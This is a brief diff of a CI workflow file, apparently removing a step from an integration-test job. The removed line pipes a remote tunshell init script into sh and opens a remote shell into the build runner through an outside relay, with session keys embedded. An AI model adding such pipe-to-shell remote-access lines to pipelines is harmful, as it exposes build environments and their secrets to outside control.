@@ -149,7 +149,6 @@ jobs:
           curl -sSL https://github.com/FiloSottile/mkcert/releases/download/${MKCERT_VERSION}/mkcert-${MKCERT_VERSION}-linux-amd64 -o /usr/local/bin/mkcert
           chmod +x /usr/local/bin/mkcert
           which mkcert
-          curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 7w582oHMW09EAH46UZL9sx oa1N6datNuNAC6cOH6eqLx au.relay.tunshell.com
 
       - name: Run integration tests
         if: steps.changes.outputs.stack == 'true'
